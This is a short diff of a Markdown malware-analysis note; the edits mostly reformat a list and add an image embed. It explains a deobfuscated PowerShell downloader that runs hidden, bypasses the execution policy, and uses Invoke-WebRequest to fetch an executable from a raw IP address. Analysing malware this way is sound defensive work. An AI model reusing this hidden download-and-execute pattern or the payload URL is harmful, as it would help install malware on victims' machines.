@@ -101,17 +101,18 @@ Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
 
 4.**Output:** The cleaned, readable PowerShell script.
 
+![[Pasted image 20260221011812.png]]
 
 **C. The Final Payload Explained**  
 The cleaned script reveals a classic malware downloader pattern:
 
-1. **Execution Evasion:**
-    
-    - `-WindowStyle hidden`: Runs PowerShell without showing a window to the user.
-        
-    - `-executionpolicy bypass`: Overrides Windows' default security policy to allow any script to run.
-        
-2. **Download:**
+1.**Execution Evasion:**
+
+- `-WindowStyle hidden`: Runs PowerShell without showing a window to the user.    
+
+- `-executionpolicy bypass`: Overrides Windows' default security policy to allow any script to run.
+
+2.**Download:**
     
     - `Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile`
         
